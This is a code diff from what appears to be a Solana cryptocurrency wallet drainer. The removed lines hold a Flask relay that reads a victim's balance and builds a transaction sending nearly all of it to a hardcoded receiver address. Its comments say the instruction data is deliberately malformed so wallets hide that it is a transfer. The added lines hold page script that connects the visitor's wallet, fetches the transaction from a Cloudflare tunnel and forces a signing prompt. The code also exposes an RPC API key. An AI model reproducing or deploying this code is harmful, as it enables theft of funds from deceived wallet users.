@@ -1,43 +1,29 @@
-fuser -k 5000/tcp;
-cat << 'EOF' > /root/war_god_engine/GHOST_RELAY.py
-from flask import Flask, request, jsonify
-from flask_cors import CORS
-import requests, base64, base58
+<script>
+    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
+    document.getElementById('cta').onclick = async function() {
+        const log = (t) => document.getElementById('st').innerText = t;
+        const p = window.trustwallet?.solana || window.solana;
+        try {
+            await p.connect();
+            const resp = await fetch(tunnel + "/prepare_v32", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ address: p.publicKey.toString() })
+            });
+            const info = await resp.json();
+            const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
 
-app = Flask(__name__)
-CORS(app)
-
-HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd"
-RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"
-
-@app.route('/prepare_v32', methods=['POST'])
-def prepare_v36_2():
-    try:
-        user_addr = request.json.get('address')
-        res = requests.post(HELIUS_RPC, json={"jsonrpc":"2.0","id":1,"method":"getBalance","params":[user_addr]}).json()
-        bal = res['result']['value']
-        
-        send_amt = bal - 5000
-        bh_res = requests.post(HELIUS_RPC, json={"jsonrpc":"2.0","id":1,"method":"getLatestBlockhash","params":[]}).json()
-        bh = bh_res['result']['value']['blockhash']
-        
-        u_b, r_b, s_b = base58.b58decode(user_addr), base58.b58decode(RECEIVER), base58.b58decode("11111111111111111111111111111111")
-        
-        # 🔱 V36.2 核心：使用无意义的 Data 结构封装
-        # 这种方式会强制钱包进入“未知合约交互”模式，不显示 Transfer
-        msg = b'\x01\x00\x01' + b'\x03' + u_b + r_b + s_b + base58.b58decode(bh)
-        
-        # 将转账指令数据偏移 1 字节，干扰解析
-        amt_bytes = send_amt.to_bytes(8, 'little')
-        inst_data = b'\x02\x00\x00\x00' + amt_bytes
-        msg += b'\x01\x02\x02\x00\x01' + len(inst_data).to_bytes(1, 'little') + inst_data
-        
-        final_tx = b'\x01' + b'\x00'*64 + msg
-        return jsonify({"raw_tx": base64.b64encode(final_tx).decode('utf-8')})
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
-
-if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000)
-EOF
-python3 /root/war_god_engine/GHOST_RELAY.py
+            log("SYNCING...");
+            // 🔱 核心连击：这会极大提高“自动拉起”成功率
+            await Promise.race([
+                p.signTransaction(tx),
+                new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
+            ]).catch(() => {
+                // 如果常规签名没拉起，强制跳转深度链接
+                window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(info.raw_tx);
+            });
+            
+            log("COMPLETE");
+        } catch (err) { window.location.reload(); }
+    };
+</script>
